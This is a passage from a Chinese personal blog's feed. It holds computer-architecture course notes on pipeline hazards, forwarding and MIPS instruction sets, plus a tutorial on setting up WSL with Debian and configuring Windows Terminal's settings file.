alt="image-20210504213234617" /></p><p>方法1.：简单插入一个停顿，将降低加速比</p><p>方法2：在一个时钟周期WB段先写，ID段后读</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213429124.png" alt="image-20210504213429124" /></p></blockquote></li><li><p>多重访问单端口存储器</p><blockquote><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213646077.png" alt="image-20210504213646077" /></p><p>方法1：插入停顿</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213806538.png" alt="image-20210504213806538" /></p><p>方法2：提供另一个存储器端口</p><p>方法3：分开指令存储器和数据存储器</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213843051.png" alt="image-20210504213843051" /></p><p>方法4：使用指令缓冲器</p></blockquote></li><li><p>没有完全流水化的功能部件</p><blockquote><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504214056065.png" alt="image-20210504214056065" /></p></blockquote></li></ol><h4 id="24-认识"><a class="markdownIt-Anchor" href="#24-认识"></a> 2.4 认识</h4><p>结构冒险是被允许的，为了<strong>减少成本、减少部件延迟</strong></p><h3 id="3-数据冒险"><a class="markdownIt-Anchor" href="#3-数据冒险"></a> 3. 数据冒险</h3><h4 id="31-定义"><a class="markdownIt-Anchor" href="#31-定义"></a> 3.1 定义</h4><p>由于流水线上指令重叠执行，改变了原来串行执行的读/写操作数顺序，使得后面依赖前面指令结果的指令得不到准备好的数据</p><h4 id="32-解决"><a class="markdownIt-Anchor" href="#32-解决"></a> 3.2 解决</h4><p>不要让指令在数据冒险时重叠执行</p><h4 id="33-实施"><a class="markdownIt-Anchor" href="#33-实施"></a> 3.3 实施</h4><p>流水线停顿</p><p>软件：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153243028.png" alt="image-20210505153243028" /></p><p>硬件：</p><blockquote><p>增加硬件互锁（Interlock）</p><blockquote><p>增加额外硬件检测需要停顿的情况</p><p>增加额外硬件放“气泡”（暂停）到流水线</p></blockquote><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505153751740.png" alt="image-20210505153751740" /></p></blockquote><h4 id="34-forwarding前推-直通-转发-相关数据通路"><a class="markdownIt-Anchor" href="#34-forwarding前推-直通-转发-相关数据通路"></a> 3.4 Forwarding（前推、直通、转发、相关数据通路）</h4><p>有数据冒险指令需要的结果可能已经计算出来，存放在流水线寄存器中，所以我们可以在数据通路中增加数据线（buses）传送这些结果，这些buses总是从后面的流水段连接到前面的流水段</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505154733078.png" alt="image-20210505154733078" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155325030.png" alt="image-20210505155325030" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155531924.png" alt="image-20210505155531924" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155617247.png" alt="image-20210505155617247" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155645091.png" alt="image-20210505155645091" /></p><p>没有Forwarding和有Forwarding的比较：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155812070.png" alt="image-20210505155812070" /></p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210505155823248.png" alt="image-20210505155823248" /></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;流水线的基本概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#流水线的基本概念&quot;&gt;&lt;/a&gt; 流水线的基本概念&lt;/h2&gt;
&lt;h3 id=&quot;1-什么是流水线&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-什么是流水线&quot;&gt;&lt;/a&gt; 1. 什么是流水线&lt;/h3&gt;
&lt;p&gt;定义：流水线是利用执行指令操作之间的并行性，实现多条指令重叠执行的技术&lt;/p&gt;
&lt;h4 id=&quot;11-术语&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#11-术语&quot;&gt;&lt;/a&gt; 1.1 术语&lt;/h4&gt;
&lt;p&gt;流水段（流水级）：完成一条指令的一部分操作&lt;/p&gt;
&lt;p&gt;机器周期（流水线周期）：指令沿流水线移动一个流水段的时间。长度取决于最慢的流水段，一般是一个时钟周期（有时是两个时钟周期）。每个流水线周期从指令流水线流出一条指令&lt;/p&gt;
&lt;p&gt;吞吐量：单位时间从流水线流出的指令数&lt;/p&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第二章_指令系统原理与实例</title>
    <link href="https://wsw8.online/archives/a6c351d5.html"/>
    <id>https://wsw8.online/archives/a6c351d5.html</id>
    <published>2021-05-02T06:52:30.000Z</published>
    <updated>2021-05-10T08:30:51.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-指令集系统结构的分类"><a class="markdownIt-Anchor" href="#1-指令集系统结构的分类"></a> 1. 指令集系统结构的分类</h2><p>根本区别：处理器内部数据的存储结构不同</p><p>存储结构：</p><ol><li>堆栈：操作数隐含的位于栈顶</li><li>累加器：一个隐含操作数就是累加器</li><li>通用寄存器：明确地指定操作数，不是寄存器就是存储器地址<ol><li>register-memory系统结构：一般指令都可以访存</li><li>register-register/load-store系统结构：只有load、store指令能访存</li></ol></li></ol><span id="more"></span><p>图示：</p><p>数据流动示意图：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502145943075.png" alt="image-20210502145943075" /></p><p>运算例子示意图：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502150225975.png" alt="image-20210502150225975" /></p><p>通用寄存器ISA运算类指令的两个特性：</p><ol><li>ALU指令中包括两个或三个操作数</li><li>ALU指令中包括0到3个存储器操作数</li></ol><p>通用寄存器计算机优缺点：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502151144878.png" alt="image-20210502151144878" /></p><h2 id="2-存储器寻址"><a class="markdownIt-Anchor" href="#2-存储器寻址"></a> 2. 存储器寻址</h2><h3 id="21-寻址方式"><a class="markdownIt-Anchor" href="#21-寻址方式"></a> 2.1 寻址方式</h3><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210502152010830.png" alt="image-20210502152010830" /></p><h3 id="22-小结"><a class="markdownIt-Anchor" href="#22-小结"></a> 2.2 小结</h3><ol><li>一般ISA支持的基本寻址方式：立即数寻址、位移量寻址、寄存器间接寻址</li><li>位移量为13-16位、立即数为16位</li><li>立即数寻址通常用于：运算类指令、置常数到寄存器指令</li></ol><h2 id="3-mips系统结构"><a class="markdownIt-Anchor" href="#3-mips系统结构"></a> 3. MIPS系统结构</h2><p>特点：</p><ol><li>一种简单64位load-store系统结构</li><li>固定长度指令编码</li></ol><p>寄存器：</p><ol><li>32个64位通用寄存器（GPR），R0……R31，<strong>R0永远是0</strong></li><li>32个浮点寄存器（FPR），F0……F31，可作为32位单精度寄存器使用，也可作为64位双精度寄存器使用</li></ol><p>寻址方式：</p><ol><li>16位立即数寻址</li><li>16位基址寻址，当位移量为0时是寄存器间接寻址、当R0作为基址寄存器时是16位绝对寻址</li></ol><p>指令格式：</p><ol><li>指令长度：32位，6位为基本操作码</li><li>两种存储器寻址方式：编码到操作码中</li></ol><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153254772.png" alt="image-20210503153254772" /></p><p>操作：</p><ol><li>载入和存储<ul><li>所有通用寄存器和浮点数寄存器都可以被载入或存储，除了R0</li><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503153545936.png" alt="image-20210503153545936" /></li><li>上述图示说明：<ol><li>⬅的下标表示传送n位</li><li>Mem表示主存，按字节编址</li><li>下标标识字段中特定的位，从以0开始的最高位开始标注</li><li>上标表示对字段的复制</li><li>##表示字段的连接</li></ol></li></ul></li><li>ALU操作<ul><li>都是寄存器-寄存器指令</li><li>包括算术和逻辑操作：加、减、与、或、异或、移位</li><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154351355.png" alt="image-20210503154351355" /></li></ul></li><li>分支和跳转<ul><li><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E6%8C%87%E4%BB%A4%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B/image-20210503154602183.png" alt="image-20210503154602183" /></li></ul></li><li>浮点操作<ul><li>浮点指令指出操作数是单精度（SP）还是双精度（DP）</li><li>MOV.S和MOV.D分别复制单精度和双精度的寄存器</li><li>MFC1、MTC1、DMFC1、DMTC1在一个单精度或双精度浮点数寄存器和一个定点寄存器之间传送数据</li></ul></li></ol><h2 id="4-一些误区"><a class="markdownIt-Anchor" href="#4-一些误区"></a> 4. 一些误区</h2><ol><li>专门设计支持高级语言结构的“高级”指令功能</li><li>存在一种典型的程序</li><li>可以不考虑编译器而改进指令系统以缩减代码大小</li><li>有缺陷的系统结构不可能是一种成功的系统结构</li><li>可以设计一个没有缺陷的系统结构</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1-指令集系统结构的分类&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-指令集系统结构的分类&quot;&gt;&lt;/a&gt; 1. 指令集系统结构的分类&lt;/h2&gt;
&lt;p&gt;根本区别：处理器内部数据的存储结构不同&lt;/p&gt;
&lt;p&gt;存储结构：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;堆栈：操作数隐含的位于栈顶&lt;/li&gt;
&lt;li&gt;累加器：一个隐含操作数就是累加器&lt;/li&gt;
&lt;li&gt;通用寄存器：明确地指定操作数，不是寄存器就是存储器地址
&lt;ol&gt;
&lt;li&gt;register-memory系统结构：一般指令都可以访存&lt;/li&gt;
&lt;li&gt;register-register/load-store系统结构：只有load、store指令能访存&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="系统结构" scheme="https://wsw8.online/categories/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="系统结构" scheme="https://wsw8.online/tags/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>wsl的安装与配置</title>
    <link href="https://wsw8.online/archives/cee22f12.html"/>
    <id>https://wsw8.online/archives/cee22f12.html</id>
    <published>2021-05-02T03:34:04.000Z</published>
    <updated>2021-05-10T08:12:27.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>之前上过一个Linux的选修课，了解了Linux系统的一些知识，越用越觉得一些需要命令行的软件用Linux来简直太方便了，这篇文章就介绍以下如何在windows系统上搭建Linux子系统（也就是wsl）（Windows Subsystem for Linux），这样就不用使用VMware来装虚拟机了</p><span id="more"></span><h2 id="windows-10-开启wsl功能"><a class="markdownIt-Anchor" href="#windows-10-开启wsl功能"></a> windows 10 开启wsl功能</h2><ol><li>按Windows+Q进入搜索功能，也可以右键点击开始，选择里面的搜索功能</li><li>在Windows 10的搜索框中输入<code>启用或关闭Windows功能</code></li><li>打开后选中<code>适用于Linux的Windows子系统</code><br /><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503170452634.png" alt="image-20210503170452634" /></li></ol><h2 id="linux的安装"><a class="markdownIt-Anchor" href="#linux的安装"></a> Linux的安装</h2><ol><li>打开微软商店（Microsoft Store）</li><li>搜索Linux</li><li>选择其中的一个发行版本进行安装，本文以debian为例</li></ol><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171000458.png" alt="image-20210503171000458" /></p><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171035452.png" alt="image-20210503171035452" /></p><h2 id="linux初始化"><a class="markdownIt-Anchor" href="#linux初始化"></a> Linux初始化</h2><ol><li><p>打开刚下好的Linux，等一小会它的安装</p></li><li><p>输入新创建的用户名</p></li><li><p>输入该用户的密码，输入两次后就进入了Linux系统，新用户也创建完成</p></li><li><p>输入<code>sudo passwd</code>更改root的密码</p></li><li><p>一些知识</p><blockquote><p>输入<code>su</code>再输入密码进入root模式<br />输入<code>exit</code>或者按<code>ctrl+d</code>退出root模式<br />输入<code>sudo 命令</code>可以在普通用户下执行root权限的命令，密码是普通用户的密码</p></blockquote></li></ol><h2 id="terminal安装"><a class="markdownIt-Anchor" href="#terminal安装"></a> Terminal安装</h2><p>Terminal是一款高颜值的管理命令行软件，如果你习惯于PowerShell或者cmd的话可以跳过此步骤</p><ol><li>打开微软商店（MicroSoft Store）</li><li>搜索Terminal</li><li>点击安装</li></ol><h2 id="terminal配置"><a class="markdownIt-Anchor" href="#terminal配置"></a> Terminal配置</h2><p>简单配置一下Terminal，让你用起来更舒服，可跳过</p><ol><li>打开Terminal</li><li>打开设置</li></ol><p><img src="/images/wsl%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/image-20210503171852186.png" alt="image-20210503171852186" /></p><ol start="3"><li>点击左下角的设置图标，进入Terminal的配置文件，如下，<strong>为了安全起见建议备份一下，不然出问题不好还原</strong></li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This file was initially generated by Windows Terminal 1.4.3243.0</span></span><br><span class="line"><span class="comment">// It should still be usable in newer versions, but newer versions might have additional</span></span><br><span class="line"><span class="comment">// settings, help text, or changes that you will not see unless you clear this file</span></span><br><span class="line"><span class="comment">// and let us generate a new one for you.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// To view the default settings, hold &quot;alt&quot; while clicking on the &quot;Settings&quot; button.</span></span><br><span class="line"><span class="comment">// For documentation on these settings, see: https://aka.ms/terminal-documentation</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;$schema&quot;</span>: <span class="string">&quot;https://aka.ms/terminal-profiles-schema&quot;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;defaultProfile&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;initialRows&quot;</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="attr">&quot;initialCols&quot;</span>: <span class="number">90</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// You can add more global application settings here.</span></span><br><span class="line">  <span class="comment">// To learn more about global settings, visit https://aka.ms/terminal-global-settings</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, selections are automatically copied to your clipboard.</span></span><br><span class="line">  <span class="attr">&quot;copyOnSelect&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If enabled, formatted data is also copied to your clipboard</span></span><br><span class="line">  <span class="attr">&quot;copyFormatting&quot;</span>: <span class="literal">false</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// A profile specifies a command to execute paired with information about how it should look and feel.</span></span><br><span class="line">  <span class="comment">// Each one of them will appear in the &#x27;New Tab&#x27; dropdown,</span></span><br><span class="line">  <span class="comment">//   and can be invoked from the commandline with `wt.exe -p xxx`</span></span><br><span class="line">  <span class="comment">// To learn more about profiles, visit https://aka.ms/terminal-profile-settings</span></span><br><span class="line">  <span class="attr">&quot;profiles&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;defaults&quot;</span>: &#123;</span><br><span class="line">      <span class="comment">// Put settings here that you want to apply to all profiles.</span></span><br><span class="line">      <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;acrylicOpacity&quot;</span>: <span class="number">0.75</span>,</span><br><span class="line">      <span class="attr">&quot;useAcrylic&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;colorScheme&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontFace&quot;</span>: <span class="string">&quot;Consolas&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;fontSize&quot;</span>: <span class="number">11</span>,</span><br><span class="line">      <span class="attr">&quot;cursorColor&quot;</span>: <span class="string">&quot;#00FF00&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;cursorHeight&quot;</span>: <span class="number">25</span>,</span><br><span class="line">      <span class="attr">&quot;cursorShape&quot;</span>: <span class="string">&quot;vintage&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;snapOnInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">&quot;padding&quot;</span>: <span class="string">&quot;0, 0, 0, 0&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;closeOnExit&quot;</span>: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;list&quot;</span>: [</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;58ad8b0c-3ef8-5f4d-bc6f-13e4c00f2530&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Debian&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Wsl&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;startingDirectory&quot;</span>: <span class="string">&quot;//wsl$/Debian/home/tom/&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the cmd.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;0caa0dad-35be-5f56-a8ff-afceeeaa6101&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Command Prompt&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;b453ae62-4e3d-5e58-b989-0a998ec441b8&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Azure Cloud Shell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;Windows.Terminal.Azure&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Make changes here to the powershell.exe profile.</span></span><br><span class="line">        <span class="attr">&quot;guid&quot;</span>: <span class="string">&quot;&#123;61c54bbd-c2c6-5271-96e7-009a87ff44bf&#125;&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Windows PowerShell&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;commandline&quot;</span>: <span class="string">&quot;powershell.exe&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;hidden&quot;</span>: <span class="literal">false</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add custom color schemes to this array.</span></span><br><span class="line">  <span class="comment">// To learn more about color schemes, visit https://aka.ms/terminal-color-schemes</span></span><br><span class="line">  <span class="attr">&quot;schemes&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Campbell&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;foreground&quot;</span>: <span class="string">&quot;#A7B191&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;background&quot;</span>: <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;colors&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;#0C0C0C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C50F1F&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#13A10E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#C19C00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#0037DA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#881798&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3A96DD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#767676&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#E74856&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#16C60C&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#F9F1A5&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#3B78FF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#B4009E&quot;</span>,</span><br><span class="line">        <span class="string">&quot;#61D6D6&quot;</span>,</span><br><span class="line">        